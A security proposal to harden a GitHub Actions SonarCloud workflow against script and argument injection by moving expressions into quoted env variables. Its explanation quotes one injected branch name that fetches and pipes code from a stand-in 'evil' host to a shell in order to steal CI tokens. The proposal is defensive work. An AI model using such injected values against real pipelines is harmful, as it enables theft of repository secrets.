# Proposal

## Why

`.github/workflows/code-npm_node-sonarcloud-analysis.yml` interpolates `${{ }}` expressions directly into `run:` scripts (GitHub Actions script injection, issue #256, follow-up to #249). A same-repo branch named e.g. `a";curl${IFS}evil|sh;"` is expanded before bash runs, so a collaborator or compromised account can exfiltrate `SONAR_TOKEN`/`GITHUB_TOKEN`. `$SCOPE_OPTIONS` is also expanded unquoted, so branch names with spaces become extra sonar-scanner flags (argument injection).

## What Changes

- Move every `${{ }}` expression used inside the two "SonarCloud / Run analysis" `run:` blocks into step-level `env:` and reference them as quoted shell variables: `github.head_ref`, `github.base_ref`, `github.event.pull_request.number`, `github.event_name`, `github.ref_name`, `github.event.release.tag_name`, `steps.version.outputs.*`.
- Build the scope options as a bash array and expand it quoted (`"${scope[@]}"`).
- Harden the "Store project information" step that writes `$GITHUB_OUTPUT` so a hostile `code/package.json` version cannot inject extra output keys.
- Add a `code/CHANGELOG.md` `[Unreleased]` entry (`kind/security`).

## Capabilities

### New Capabilities

None. CI tooling hardening; no product spec-level behavior changes (`skip_specs: true`).

### Modified Capabilities

None.

## Impact

- `.github/workflows/code-npm_node-sonarcloud-analysis.yml` only (a repo-wide grep found no other untrusted `${{ }}` in `run:` in `.github/workflows` or the CLI workflow templates).
- `code/CHANGELOG.md`.
- Sonar analysis behavior unchanged for well-formed inputs.
